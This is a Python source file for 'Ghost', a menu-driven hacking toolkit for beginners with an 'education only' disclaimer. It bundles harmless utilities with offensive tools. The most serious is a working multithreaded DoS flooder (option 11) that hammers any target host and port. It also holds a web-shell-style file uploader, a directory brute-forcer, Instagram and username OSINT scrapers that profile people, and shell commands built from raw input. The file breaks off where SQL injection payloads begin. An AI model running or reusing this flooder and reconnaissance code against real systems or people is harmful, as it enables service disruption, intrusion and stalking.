import pyfiglet
import time
import sys
import nmap
import socket
from colorama import init, Fore, Style
from Crypto.Cipher import AES
from Crypto import Random
import requests
import subprocess
import os
import smtplib
import tempfile
import subprocess
import re
import smtplib
from email.message import EmailMessage 
import string
import random
import scapy.all as scapy
import instaloader
import threading
from urllib.parse import urlparse
from bs4 import BeautifulSoup
init()
text = "Ghost"
formatted_text = pyfiglet.figlet_format(text)
print (Fore.BLUE + formatted_text + Style.RESET_ALL)
words = [Fore.MAGENTA + "<Ghost> : "+ Style.RESET_ALL,"Hi","user","welcome","to",Fore.MAGENTA +"@Ghost"+ Style.RESET_ALL,Fore.RED +":)"+Style.RESET_ALL,Fore.MAGENTA +"\n\n<Ghost> : "+ Style.RESET_ALL,"Ghost", "is",Fore.RED +"simple","virus","and","tools"+ Style.RESET_ALL,"for","Beginner","programming","in","\n           python",Fore.RED +"this"," some","my","tool","encryption","AES","","\n           stealing","passwords","WIFI","and" ,"info"+ Style.RESET_ALL,"this","tool","is","for","education","\n           purposes","only"," the","author","is","not","responsible","for","any","losses","\n           or","damage","caused","by","this","program.",Fore.RED +"\n\n                       <choose number>"+ Style.RESET_ALL,Fore.MAGENTA + "\n\n<Ghost> : "+ Style.RESET_ALL,"\n           (1) encryption AES","\n           (2) change mac address","\n           (3) Generate strong passwords","\n           (4) network-scanner","\n           (5) Locate using ip","\n           (6) search-user","\n           (7) scan port","\n           (8) instgram OSINT","\n           (9) ghostbuster","\n           (10) Network Interface","\n           (11) Dos attack","\n           (12) Check the security of HTTP headers on the site","\n           (13) test upload web","\n           (14) Bug Bounty script","\n           (15) EXIT"]
for word in words:
    print(word, end=' ', flush=True)
    time.sleep(0.09)  
print()  
choose = input (Fore.YELLOW + "<user> :  "+ Style.RESET_ALL)
if choose == '1':
    words = [Fore.MAGENTA +"<Ghost> : "+ Style.RESET_ALL,"Hi","you","chose","the","third",Fore.GREEN +"encryption AES"+ Style.RESET_ALL,"right?",Fore.RED +"yes/no"+ Style.RESET_ALL]
    for word in words:
        print(word, end=' ', flush=True)
        time.sleep(0.09)
    print()
    saif = input (Fore.YELLOW +"<user> :  "+ Style.RESET_ALL) 
    if saif == 'yes' :
        words = [Fore.MAGENTA +"<Ghost> : "+ Style.RESET_ALL,"ok","write","path","file","and","encryption","key","you","want","write","yes"]
        for word in words:
            print(word, end=' ', flush=True)
            time.sleep(0.09)  
        print()
        a = input (Fore.YELLOW +"<user> :  "+ Style.RESET_ALL)
        if a == 'yes':  
            words = [Fore.MAGENTA +"<Ghost> : "+ Style.RESET_ALL,"write","path","file"]
            for word in words:
                print(word, end=' ', flush=True)
                time.sleep(0.09)
            print()
            path = input(Fore.YELLOW +"<user> :  "+ Style.RESET_ALL)
            words = [Fore.MAGENTA + "<Ghost> : "+ Style.RESET_ALL,"Ok"]
            for word in words:
                print(word, end=' ', flush=True)
                time.sleep(0.09)
            print()
            key_value = input(Fore.MAGENTA +"<Ghost> :  Enter the key: "+Style.RESET_ALL)
            padding = lambda s: s + (32 - len(s) % 32) * "*"
            key = padding(key_value).encode('ascii')
            def encryption(key, o_file):
                block_size = AES.block_size
                with open(o_file, 'r+b') as f:
                    iv = Random.new().read(16)
                    c = AES.new(key, AES.MODE_OFB, iv)
                    plaintext = f.read(block_size)
                    while plaintext:
                        f.seek(-len(plaintext), 1)
                        f.write(c.encrypt(plaintext))
                        plaintext = f.read(block_size)
                    return [key, iv]
            def decryption(key, iv, e_file):
                block_size = AES.block_size
                with open(e_file, 'r+b') as f:
                    plaintext = f.read(block_size)
                    d = AES.new(key, AES.MODE_OFB, iv)
                    while plaintext:
                        f.seek(-len(plaintext), 1)
                        f.write(d.decrypt(plaintext))
                        plaintext = f.read(block_size)
            e = encryption(key, path)
            print("File encrypted. Key and IV:", e)

            de = input("Do you want to decrypt the file? (y/n): ")
            if de.lower() == "y":
                decryption(e[0], e[1], path)
                print("File decrypted.")
        elif a == 'no':
            sys.exit()  
        else:
            words = [Fore.MAGENTA +"<Ghost> : "+ Style.RESET_ALL,"you","must","choose",Fore.RED +"yes","or","no"+ Style.RESET_ALL]
            for word in words:
                print(word, end=' ', flush=True)
                time.sleep(0.09)
            print()  
    elif saif == 'no':
        words = [Fore.MAGENTA +"<Ghost> : "+ Style.RESET_ALL,"you","can","choose","another","tool"]
        for word in words:
            print(word, end=' ', flush=True)
            time.sleep(0.09)
        print()
        sys.exit()  
    else:    
        sys.exit(Fore.MAGENTA +"<Ghost> :  you must choose yes or no"+ Style.RESET_ALL)  
elif choose == '2':
    words = [Fore.MAGENTA +"<Ghost> : "+ Style.RESET_ALL,"Hi","you","chose","the","five",Fore.GREEN +"change mac address"+ Style.RESET_ALL,"right?",Fore.RED +"yes/no"+ Style.RESET_ALL]
    for word in words:
        print(word, end=' ', flush=True)
        time.sleep(0.09)
    print()
    saif = input (Fore.YELLOW +"<user> :  "+ Style.RESET_ALL) 
    if saif == 'yes' :
        def get_current_mac(network_interface):
            try:
                ifconfig_result = subprocess.check_output(f"ifconfig {network_interface}", shell=True).decode("UTF-8")
                mac_address = re.search(r"\w\w:\w\w:\w\w:\w\w:\w\w:\w\w", ifconfig_result)  
                if mac_address:
                    return mac_address.group(0)
                else:
                    print("[-] MAC Address not found.")
            except subprocess.CalledProcessError:
                print(f"[-] Failed to execute ifconfig command on interface {network_interface}. Make sure the interface exists.")
            return None
        def mac_changer(network_interface, new_mac):
            try:
                subprocess.call(f"ifconfig {network_interface} down", shell=True)
                subprocess.call(f"ifconfig {network_interface} hw ether {new_mac}", shell=True)
                subprocess.call(f"ifconfig {network_interface} up", shell=True)
                print(f"[+] The MAC address of {network_interface} has been changed to {new_mac}")
            except Exception as e:
                print(f"[-] An error occurred while changing the MAC address: {e}")
        def main():
            network_interface = input("[?] Enter the name of the network interface:")
            new_mac = input("[?] Enter the new MAC address (xx:xx:xx:xx:xx:xx):")
            current_mac = get_current_mac(network_interface)
            if current_mac:
                print(f"[+] The current MAC address of {network_interface}: {current_mac}")
            else:
                print("[-] The current MAC address was not retrieved. Follow up with trying to change.")
            mac_changer(network_interface, new_mac)

            updated_mac = get_current_mac(network_interface)
            if updated_mac == new_mac:
                print(f"[+] MAC address successfully changed to: {updated_mac}")
            else:
                print("[-] An error occurred. The MAC address has not changed.")
        if __name__ == "__main__":
            main()
    elif saif == 'no':
        words = [Fore.MAGENTA +"<Ghost> : "+ Style.RESET_ALL,"you","can","choose","another","tool"]
        for word in words:
            print(word, end=' ', flush=True)
            time.sleep(0.09)
        print()
        sys.exit()  
    else:
        words = [Fore.MAGENTA + "<Ghost> : "+ Style.RESET_ALL,"you","must","chose",Fore.RED + "yes","or","no"+ Style.RESET_ALL]
        for word in words:
            print(word, end=' ', flush=True)
            time.sleep(0.09)
        print()
elif choose == '3':
    words = [Fore.MAGENTA +"<Ghost> : "+ Style.RESET_ALL,"Hi","you","chose","the","six",Fore.GREEN +"Generate strong passwords"+ Style.RESET_ALL,"right?",Fore.RED +"yes/no"+ Style.RESET_ALL]
    for word in words:
        print(word, end=' ', flush=True)
        time.sleep(0.09)
    print()
    saif = input (Fore.YELLOW +"<user> :  "+ Style.RESET_ALL) 
    if saif == 'yes' :
        def generate_password(length=16):
            characters = string.ascii_letters + string.digits + string.punctuation
            password = ''.join(random.choice(characters) for _ in range(length))
            return password
        print(Fore.MAGENTA +"<Ghost> :"+ Style.RESET_ALL,f"Generated password: {generate_password()}" )
    elif saif == 'no':
        words = [Fore.MAGENTA +"<Ghost> : "+ Style.RESET_ALL,"you","can","choose","another","tool"]
        for word in words:
            print(word, end=' ', flush=True)
            time.sleep(0.09)
        print()
        sys.exit()  
    else:
        words = [Fore.MAGENTA + "<Ghost> : "+ Style.RESET_ALL,"you","must","chose",Fore.RED + "yes","or","no"+ Style.RESET_ALL]
        for word in words:
            print(word, end=' ', flush=True)
            time.sleep(0.09)
        print()
elif choose == '4':
    words = [Fore.MAGENTA +"<Ghost> : "+ Style.RESET_ALL,"Hi","you","chose","the","seven",Fore.GREEN +"network-scanner"+ Style.RESET_ALL,"right?",Fore.RED +"yes/no"+ Style.RESET_ALL]
    for word in words:
        print(word, end=' ', flush=True)
        time.sleep(0.09)
    print()
    saif = input (Fore.YELLOW +"<user> :  "+ Style.RESET_ALL) 
    if saif == 'yes' :
        def get_network_range():
            words = [Fore.MAGENTA +"<Ghost> : "+ Style.RESET_ALL,"Enter","the device","IP","example","(192.168.1.0/24):"]
            for word in words:
                print(word, end=' ', flush=True)
                time.sleep(0.09)
            print()
            return input(Fore.YELLOW +"<user> :  "+ Style.RESET_ALL)
        def scan(network_ip):
            arp_request = scapy.ARP(pdst=network_ip)  
            arp_broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")  
            arp_request_broadcast = arp_broadcast / arp_request
            answered = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]
            client_list = []
            for answer in answered:
                client_dict = {"ip": answer[1].psrc, "mac": answer[1].hwsrc}
                client_list.append(client_dict)
            return client_list

        def display_clients(clients):
            print(Fore.RED +"IP Address \t\t\t MAC Address"+ Style.RESET_ALL)
            print("-" * 50)
            for client in clients:
                print(client["ip"], "\t\t\t", client["mac"])
        network_ip = get_network_range()
        client_list = scan(network_ip)
        display_clients(client_list)
    elif saif == 'no':
        words = [Fore.MAGENTA +"<Ghost> : "+ Style.RESET_ALL,"you","can","choose","another","tool"]
        for word in words:
            print(word, end=' ', flush=True)
            time.sleep(0.09)
        print()
        sys.exit()  
    else:
        words = [Fore.MAGENTA + "<Ghost> : "+ Style.RESET_ALL,"you","must","chose",Fore.RED + "yes","or","no"+ Style.RESET_ALL]
        for word in words:
            print(word, end=' ', flush=True)
            time.sleep(0.09)
        print()
elif choose == '5':
    words = [Fore.MAGENTA +"<Ghost> : "+ Style.RESET_ALL,"Hi","you","chose","the","eight",Fore.GREEN +"locat using ip"+ Style.RESET_ALL,"right?",Fore.RED +"yes/no"+ Style.RESET_ALL]
    for word in words:
        print(word, end=' ', flush=True)
        time.sleep(0.09)
    print()
    saif = input (Fore.YELLOW +"<user> :  "+ Style.RESET_ALL) 
    if saif == 'yes' :
        def track_ip(ip):
            try:
                response = requests.get(f"https://ipinfo.io/{ip}/json")
                if response.status_code != 200:
                    print(Fore.MAGENTA +"<Ghost> : "+ Style.RESET_ALL,f"error api{response.status_code}).")
                    return
                data = response.json()
                if "bogon" in data:
                    print(Fore.MAGENTA +"<Ghost> : "+ Style.RESET_ALL," error ip")
                    return
                print(Fore.CYAN + f"IP Address  : {data.get('ip', 'N/A')}")
                print(f"Country     : {data.get('country', 'N/A')}")
                print(f"Region      : {data.get('region', 'N/A')}")
                print(f"City        : {data.get('city', 'N/A')}")
                print(f"Location    : {data.get('loc', 'N/A')}")  
                print(f"zip Code    : {data.get('postal', 'N/A')}")
            except Exception as e:
                print(Fore.MAGENTA +"<Ghost> : "+ Style.RESET_ALL,f" error {e}")
        def main():
            words = [Fore.MAGENTA +"<Ghost> : "+ Style.RESET_ALL,"write","ip"]
            for word in words:
                print(word, end=' ', flush=True)
                time.sleep(0.09)
            print()
            ip = input(Fore.YELLOW +"<user> :  "+ Style.RESET_ALL)
            track_ip(ip)
        if __name__ == "__main__":
            main()
    elif saif == 'no':
        words = [Fore.MAGENTA +"<Ghost> : "+ Style.RESET_ALL,"you","can","choose","another","tool"]
        for word in words:
            print(word, end=' ', flush=True)
            time.sleep(0.09)
        print()
        sys.exit()  
    else:
        words = [Fore.MAGENTA + "<Ghost> : "+ Style.RESET_ALL,"you","must","chose",Fore.RED + "yes","or","no"+ Style.RESET_ALL]
        for word in words:
            print(word, end=' ', flush=True)
            time.sleep(0.09)
        print()
elif choose == '6':
    words = [Fore.MAGENTA +"<Ghost> : "+ Style.RESET_ALL,"Hi","you","chose","the","nine",Fore.GREEN +"search user"+ Style.RESET_ALL,"right?",Fore.RED +"yes/no"+ Style.RESET_ALL]
    for word in words:
        print(word, end=' ', flush=True)
        time.sleep(0.09)
    print()
    saif = input (Fore.YELLOW +"<user> :  "+ Style.RESET_ALL) 
    if saif == 'yes' :
        SITES = {
            "GitHub": "https://github.com/{}",
            "Twitter": "https://twitter.com/{}",
            "Instagram": "https://www.instagram.com/{}",
            "Facebook": "https://www.facebook.com/{}",
            "YouTube": "https://www.youtube.com/{}",
            "Reddit": "https://www.reddit.com/user/{}",
            "LinkedIn": "https://www.linkedin.com/in/{}",
            "Pinterest": "https://www.pinterest.com/{}",
            "Tumblr": "https://{}.tumblr.com/",
            "Flickr": "https://www.flickr.com/people/{}",
            "Vimeo": "https://vimeo.com/{}",
            "SoundCloud": "https://soundcloud.com/{}",
            "Medium": "https://medium.com/@{}",
            "DeviantArt": "https://{}.deviantart.com/",
            "VK": "https://vk.com/{}",
            "Steam": "https://steamcommunity.com/id/{}",
        }
        def search_username(username):
            print(Fore.MAGENTA +"<Ghost> : "+ Style.RESET_ALL,f"Searching for username: {username}\n")
            
            for site, url in SITES.items():
                full_url = url.format(username)
                response = requests.get(full_url)
                
                if response.status_code == 200:
                    print(Fore.MAGENTA +"<Ghost> : "+ Style.RESET_ALL,f"[+] Found on {site}: {full_url}")
                else:
                    print(Fore.MAGENTA +"<Ghost> : "+ Style.RESET_ALL,f"[-] Not found on {site}")
        if __name__ == "__main__":
            words = [Fore.MAGENTA +"<Ghost> : "+ Style.RESET_ALL,"write","username"]
            for word in words:
                print(word, end=' ', flush=True)
                time.sleep(0.09)
            print()
            username = input(Fore.YELLOW +"<user> :  "+ Style.RESET_ALL)
            search_username(username)
            exit
    elif saif == 'no':
        words = [Fore.MAGENTA +"<Ghost> : "+ Style.RESET_ALL,"you","can","choose","another","tool"]
        for word in words:
            print(word, end=' ', flush=True)
            time.sleep(0.09)
        print()
        sys.exit()  
    else:
        words = [Fore.MAGENTA + "<Ghost> : "+ Style.RESET_ALL,"you","must","chose",Fore.RED + "yes","or","no"+ Style.RESET_ALL]
        for word in words:
            print(word, end=' ', flush=True)
            time.sleep(0.09)
        print()
elif choose == '7':
    words = [Fore.MAGENTA +"<Ghost> : "+ Style.RESET_ALL,"Hi","you","chose","the","ten",Fore.GREEN +"scan port"+ Style.RESET_ALL,"right?",Fore.RED +"yes/no"+ Style.RESET_ALL]
    for word in words:
        print(word, end=' ', flush=True)
        time.sleep(0.09)
    print()
    saif = input (Fore.YELLOW +"<user> :  "+ Style.RESET_ALL) 
    if saif == 'yes' :
        def banner():
            print("=" * 60)
            print("Nmap Port Scanner - Full Port Details")
            print("=" * 60)
        def scan_ports(host):
            try:
                nm = nmap.PortScanner()
                print(f"\n scannig port : {host}\n")
                nm.scan(hosts=host, arguments='-sV -T4')

                if not nm.all_hosts():
                    print(" don't find target is avalibal.")
                    return

                for host in nm.all_hosts():
                    print(f"\n host: {host}")
                    print(f" state: {nm[host].state()}")

                    for proto in nm[host].all_protocols():
                        print(f"\n protocol: {proto.upper()}")
                        ports = sorted(nm[host][proto].keys())

                        for port in ports:
                            port_data = nm[host][proto][port]
                            print(f"\n port {port}")
                            for key, value in port_data.items():
                                print(f"   ➤ {key}: {value}")
                print("\n done :).")
            except KeyboardInterrupt:
                print("\n stop from users.")
            except Exception as e:
                print(f" false: {e}")

        if __name__ == "__main__":
            banner()
            target = input("write ip: ").strip()
            scan_ports(target)
    elif saif == 'no':
        words = [Fore.MAGENTA +"<Ghost> : "+ Style.RESET_ALL,"you","can","choose","another","tool"]
        for word in words:
            print(word, end=' ', flush=True)
            time.sleep(0.09)
        print()
        sys.exit()  
    else:
        words = [Fore.MAGENTA + "<Ghost> : "+ Style.RESET_ALL,"you","must","chose",Fore.RED + "yes","or","no"+ Style.RESET_ALL]
        for word in words:
            print(word, end=' ', flush=True)
            time.sleep(0.09)
        print()

elif choose == '8':
    words = [Fore.MAGENTA +"<Ghost> : "+ Style.RESET_ALL,"Hi","you","chose","the","eleven",Fore.GREEN +"instgram osint"+ Style.RESET_ALL,"right?",Fore.RED +"yes/no"+ Style.RESET_ALL]
    for word in words:
        print(word, end=' ', flush=True)
        time.sleep(0.09)
    print()
    saif = input (Fore.YELLOW +"<user> :  "+ Style.RESET_ALL) 
    if saif == 'yes' :
        bot = instaloader.Instaloader()
        print(Fore.MAGENTA +"<Ghost> : "+ Style.RESET_ALL,"Enter Instagram username: ")
        username = input(Fore.YELLOW +"<user> :  "+ Style.RESET_ALL,)
        try:
            profile = instaloader.Profile.from_username(bot.context, username)
            print(Fore.MAGENTA +"<Ghost> : "+ Style.RESET_ALL,"\n Profile Information:")
            print(Fore.MAGENTA +"<Ghost> : "+ Style.RESET_ALL,f"Username: {profile.username}")
            print(Fore.MAGENTA +"<Ghost> : "+ Style.RESET_ALL,f"User ID: {profile.userid}")
            print(Fore.MAGENTA +"<Ghost> : "+ Style.RESET_ALL,f"Profile Picture URL: {profile.profile_pic_url}")
            print(Fore.MAGENTA +"<Ghost> : "+ Style.RESET_ALL,f"Verified: {'Yes' if profile.is_verified else 'No'}")
            print(Fore.MAGENTA +"<Ghost> : "+ Style.RESET_ALL,f"Private Account: {'Yes' if profile.is_private else 'No'}")
            print(Fore.MAGENTA +"<Ghost> : "+ Style.RESET_ALL,f"Followers: {profile.followers}")
            print(Fore.MAGENTA +"<Ghost> : "+ Style.RESET_ALL,f"Following: {profile.followees}")
            bot.download_profile(username)
            bot.download_profilepic(username)
            bot.download_profile(username, profile_pic_only=False)
            print(Fore.MAGENTA +"<Ghost> : "+ Style.RESET_ALL,"\n Profile picture downloaded successfully!")
        except Exception as e:
            print(Fore.MAGENTA +"<Ghost> : "+ Style.RESET_ALL,f"\n Error: {e}")
    elif saif == 'no':
        words = [Fore.MAGENTA +"<Ghost> : "+ Style.RESET_ALL,"you","can","choose","another","tool"]
        for word in words:
            print(word, end=' ', flush=True)
            time.sleep(0.09)
        print()
        sys.exit()  
    else:
        words = [Fore.MAGENTA + "<Ghost> : "+ Style.RESET_ALL,"you","must","chose",Fore.RED + "yes","or","no"+ Style.RESET_ALL]
        for word in words:
            print(word, end=' ', flush=True)
            time.sleep(0.09)
        print()
elif choose == '9':
    words = [Fore.MAGENTA +"<Ghost> : "+ Style.RESET_ALL,"Hi","you","chose","the","twelve",Fore.GREEN +"ghostbuster"+ Style.RESET_ALL,"right?",Fore.RED +"yes/no"+ Style.RESET_ALL]
    for word in words:
        print(word, end=' ', flush=True)
        time.sleep(0.09)
    print()
    saif = input (Fore.YELLOW +"<user> :  "+ Style.RESET_ALL) 
    if saif == 'yes' :
        found_urls = []
        lock = threading.Lock()
        print(Fore.MAGENTA + "<Ghost> : " + Style.RESET_ALL, "write url | (https://example.com) : ")
        url = input(Fore.YELLOW + "<user> :  " + Style.RESET_ALL).strip("/")
        print(Fore.MAGENTA + "<Ghost> : " + Style.RESET_ALL, "write file txt(ex: wordlist.txt) : ")
        wordlist_path = input(Fore.YELLOW + "<user> :  " + Style.RESET_ALL)
        num_threads = 10
        with open(wordlist_path, "r", encoding="utf-8") as file:
            words = [line.strip() for line in file if line.strip()]
        def scan(word):
            full_url = f"{url}/{word}"
            try:
                response = requests.get(full_url)
                if response.status_code == 200:
                    with lock: 
                        found_urls.append(full_url)
                    print(Fore.GREEN + "<Ghost> : " + Style.RESET_ALL, f"[+] found: {full_url}")
                elif response.status_code == 404:
                    print(Fore.RED + "<Ghost> : " + Style.RESET_ALL, f"[-] not found: {full_url}")
            except requests.exceptions.RequestException:
                pass
        threads = []
        for word in words:
            while threading.active_count() > num_threads:
                pass
            thread = threading.Thread(target=scan, args=(word,))
            thread.start()
            threads.append(thread)
        for thread in threads:
            thread.join()
        print("\n" + Fore.MAGENTA + "<Ghost> : " + Style.RESET_ALL + "All found URLs (200):")
        for url in found_urls:
            print(Fore.GREEN + "<Ghost> : " + Style.RESET_ALL + url)
    elif saif == 'no':
        words = [Fore.MAGENTA +"<Ghost> : "+ Style.RESET_ALL,"you","can","choose","another","tool"]
        for word in words:
            print(word, end=' ', flush=True)
            time.sleep(0.09)
        print()
        sys.exit()  
    else:
        words = [Fore.MAGENTA + "<Ghost> : "+ Style.RESET_ALL,"you","must","chose",Fore.RED + "yes","or","no"+ Style.RESET_ALL]
        for word in words:
            print(word, end=' ', flush=True)
            time.sleep(0.09)
        print()
        print(Fore.MAGENTA +"<Ghost> : "+ Style.RESET_ALL,"finsh !")
elif choose == '10' :
    words = [Fore.MAGENTA +"<Ghost> : "+ Style.RESET_ALL,"Hi","you","chose","the","Thirteen",Fore.GREEN +"change Network Interface "+ Style.RESET_ALL,"right?",Fore.RED +"yes/no"+ Style.RESET_ALL]
    for word in words:
        print(word, end=' ', flush=True)
        time.sleep(0.09)
    print()
    saif = input (Fore.YELLOW +"<user> :  "+ Style.RESET_ALL) 
    if saif == 'yes' :
        old_interface = input(Fore.MAGENTA +"<Ghost> : "+ Style.RESET_ALL,"write network face old : ")
        new_interface = input(Fore.MAGENTA +"<Ghost> : "+ Style.RESET_ALL,"write network face new : ")

        def change_interface_name():
            try:
                os.system(f"sudo ip link set {old_interface} down")
                os.system(f"sudo ip link set {old_interface} name {new_interface}")
                os.system(f"sudo ip link set {new_interface} up")
                print(f"change {old_interface} to {new_interface} ")
            except Exception as e:
                print(f"error: {e}")
            change_interface_name()
    elif saif == 'no':
        words = [Fore.MAGENTA +"<Ghost> : "+ Style.RESET_ALL,"you","can","choose","another","tool"]
        for word in words:
            print(word, end=' ', flush=True)
            time.sleep(0.09)
        print()
        sys.exit()  
    else:
        words = [Fore.MAGENTA + "<Ghost> : "+ Style.RESET_ALL,"you","must","chose",Fore.RED + "yes","or","no"+ Style.RESET_ALL]
        for word in words:
            print(word, end=' ', flush=True)
            time.sleep(0.09)
        print()
elif choose == '11' :
    words = [Fore.MAGENTA +"<Ghost> : "+ Style.RESET_ALL,"Hi","you","chose","the","Fourteen",Fore.GREEN +"Dos attack"+ Style.RESET_ALL,"right?",Fore.RED +"yes/no"+ Style.RESET_ALL]
    for word in words:
        print(word, end=' ', flush=True)
        time.sleep(0.09)
    print()
    saif = input (Fore.YELLOW +"<user> :  "+ Style.RESET_ALL) 
    if saif == 'yes' :
        print(Fore.MAGENTA + "<Ghost> : "+ Style.RESET_ALL,"write URL or IP: ")
        target = input(Fore.YELLOW +"<user> :  "+ Style.RESET_ALL)
        print(Fore.MAGENTA + "<Ghost> : "+ Style.RESET_ALL,"write port (example : 80) ")
        port = int(input(Fore.YELLOW +"<user> :  "+ Style.RESET_ALL) or 80)
        print(Fore.MAGENTA + "<Ghost> : "+ Style.RESET_ALL,"write number Threads  (example 500): ")
        thread_count = int(input(Fore.YELLOW +"<user> :  "+ Style.RESET_ALL) or 500)
        user_agents = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)",
            "Mozilla/5.0 (iPhone; CPU iPhone OS 14_2 like Mac OS X)",
            "Mozilla/5.0 (Linux; Android 10; SM-G973F)",
            "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:47.0)"
        ]
        def attack():
            while True:
                try:
                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    s.settimeout(3)
                    s.connect((target, port))
                    user_agent = random.choice(user_agents)
                    request = f"GET / HTTP/1.1\r\nHost: {target}\r\nUser-Agent: {user_agent}\r\nConnection: keep-alive\r\n\r\n"
                    s.sendall(request.encode('ascii'))
                    s.close()
                    print(Fore.GREEN +"<Ghost> : "+ Style.RESET_ALL,f"[+] attack sccuss {target}:{port} use {user_agent}")
                except socket.error:
                    print(Fore.RED +"<Ghost> : "+ Style.RESET_ALL,"[-] error ")
                except KeyboardInterrupt:
                    print(Fore.RED +"<Ghost> : "+ Style.RESET_ALL,"\n[*] stop attack automatic")
                    break
        for i in range(thread_count):
            thread = threading.Thread(target=attack)
            thread.start()
    elif saif == 'no':
        words = [Fore.MAGENTA +"<Ghost> : "+ Style.RESET_ALL,"you","can","choose","another","tool"]
        for word in words:
            print(word, end=' ', flush=True)
            time.sleep(0.09)
        print()
        sys.exit()  
    else:
        words = [Fore.MAGENTA + "<Ghost> : "+ Style.RESET_ALL,"you","must","chose",Fore.RED + "yes","or","no"+ Style.RESET_ALL]
        for word in words:
            print(word, end=' ', flush=True)
            time.sleep(0.09)
        print()
elif choose == '12' :
    words = [Fore.MAGENTA +"<Ghost> : "+ Style.RESET_ALL,"Hi","you","chose","the","Fifteen",Fore.GREEN +"checks HTTP"+ Style.RESET_ALL,"right?",Fore.RED +"yes/no"+ Style.RESET_ALL]
    for word in words:
        print(word, end=' ', flush=True)
        time.sleep(0.09)
    print()
    print (Fore.MAGENTA +"<Ghost> : "+ Style.RESET_ALL,"This script checks HTTP security headers to see if the site is secure or not.")
    saif = input (Fore.YELLOW +"<user> :  "+ Style.RESET_ALL) 
    if saif == 'yes' :
        print(Fore.MAGENTA +"<Ghost> :"+ Style.RESET_ALL,"write url  ")
        target_url = input(Fore.YELLOW +"<user> :  "+ Style.RESET_ALL)
        response = requests.get(target_url)
        headers = [
            "X-Frame-Options",
            "X-XSS-Protection",
            "X-Content-Type-Options",
            "Strict-Transport-Security",
            "Content-Security-Policy"
        ]
        for header in headers:
            if header in response.headers:
                print(Fore.MAGENTA +"<Ghost> : "+ Style.RESET_ALL,f"{header} found : {response.headers[header]}")
            else:
                print(Fore.MAGENTA +"<Ghost> : "+ Style.RESET_ALL,f"{header} not found can this not security!")
    elif saif == 'no':
        words = [Fore.MAGENTA +"<Ghost> : "+ Style.RESET_ALL,"you","can","choose","another","tool"]
        for word in words:
            print(word, end=' ', flush=True)
            time.sleep(0.09)
        print()
        sys.exit()  
    else:
        words = [Fore.MAGENTA + "<Ghost> : "+ Style.RESET_ALL,"you","must","chose",Fore.RED + "yes","or","no"+ Style.RESET_ALL]
        for word in words:
            print(word, end=' ', flush=True)
            time.sleep(0.09)
        print()
elif choose == '13' :
    words = [Fore.MAGENTA +"<Ghost> : "+ Style.RESET_ALL,"Hi","you","chose","the","sixteen",Fore.GREEN +"test upload web"+ Style.RESET_ALL,"right?",Fore.RED +"yes/no"+ Style.RESET_ALL]
    for word in words:
        print(word, end=' ', flush=True)
        time.sleep(0.09)
    print()
    saif = input (Fore.YELLOW +"<user> :  "+ Style.RESET_ALL) 
    if saif == 'yes' :
        print(Fore.MAGENTA +"<Ghost> : "+ Style.RESET_ALL,"write url")
        upload_url = input(Fore.YELLOW +"<user> :  "+ Style.RESET_ALL)
        print(Fore.MAGENTA +"<Ghost> : "+ Style.RESET_ALL,"write file name (.exe/.php)")
        file_path = input(Fore.YELLOW +"<user> :  "+ Style.RESET_ALL)
        files = {"file": open(file_path, "rb")}
        response = requests.post(upload_url, files=files)
        if response.status_code == 200:
            print(Fore.MAGENTA +"<Ghost> : "+ Style.RESET_ALL,"sccuss upload !")
            if "http" in response.text:
                print(Fore.MAGENTA +"<Ghost> : "+ Style.RESET_ALL,"url upload", response.text)
            else:
                print(Fore.MAGENTA +"<Ghost> : "+ Style.RESET_ALL,"the file is upload but the url is not found!")
        else:
            print(Fore.MAGENTA +"<Ghost> : "+ Style.RESET_ALL,"can't upload !")
    elif saif == 'no':
        words = [Fore.MAGENTA +"<Ghost> : "+ Style.RESET_ALL,"you","can","choose","another","tool"]
        for word in words:
            print(word, end=' ', flush=True)
            time.sleep(0.09)
        print()
        sys.exit()  
    else:
        words = [Fore.MAGENTA + "<Ghost> : "+ Style.RESET_ALL,"you","must","chose",Fore.RED + "yes","or","no"+ Style.RESET_ALL]
        for word in words:
            print(word, end=' ', flush=True)
            time.sleep(0.09)
        print()
elif choose == '14' :
    words = [Fore.MAGENTA +"<Ghost> : "+ Style.RESET_ALL,"Hi","you","chose","the","seventeen",Fore.GREEN +"script bugbounty"+ Style.RESET_ALL,"right?",Fore.RED +"yes/no"+ Style.RESET_ALL]
    for word in words:
        print(word, end=' ', flush=True)
        time.sleep(0.09)
    print()
    saif = input (Fore.YELLOW +"<user> :  "+ Style.RESET_ALL) 
    if saif == 'yes' :
        init(autoreset=True)
        class UltimateScanner:
            def __init__(self, target_url):
                self.target_url = target_url
                self.session = requests.Session()
                self.vulnerabilities = []
                self.setup_session()
            def setup_session(self):
                self.session.headers = {
                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
                    'Accept-Language': 'en-US,en;q=0.5',
                }
                self.timeout = 15
            def print_vuln(self, vuln_type, url, payload, details):
                colors = {
                    'Critical': Fore.RED,
                    'High': Fore.YELLOW,
                    'Medium': Fore.CYAN,
                    'Low': Fore.MAGENTA
                }
                color = colors.get(vuln_type, Fore.WHITE)
                print(Fore.MAGENTA +"<Ghost> : "+ Style.RESET_ALL,f"{color}[{vuln_type}] {Fore.WHITE}URL: {url}")
                print(Fore.MAGENTA +"<Ghost> : "+ Style.RESET_ALL,f"{color}Payload: {Style.BRIGHT}{payload}")
                print(Fore.MAGENTA +"<Ghost> : "+ Style.RESET_ALL,f"{color}Details: {details}{Style.RESET_ALL}")
                print("-" * 80)
            def start_scan(self):
                print(Fore.MAGENTA +"<Ghost> : "+ Style.RESET_ALL,f"{Fore.GREEN}Starting scan for: {self.target_url}\n")
                start_time = time.time()
                checks = [
                    self.check_sqli,
                    self.check_xss,
                    self.check_command_injection,
                    self.check_directory_traversal,
                    self.check_file_upload,
                    self.check_insecure_headers,
                    self.check_ssrf,
                    self.check_cors,
                    self.check_csrf
                ]
                for check in checks:
                    check()
                    time.sleep(0.5)  
                print(Fore.MAGENTA +"<Ghost> : "+ Style.RESET_ALL,f"{Fore.GREEN}Scan completed in {time.time() - start_time:.2f} seconds")
                print(Fore.MAGENTA +"<Ghost> : "+ Style.RESET_ALL,f"{Fore.RED}Total vulnerabilities found: {len(self.vulnerabilities)}\n")
            def check_sqli(self):
                payloads = [
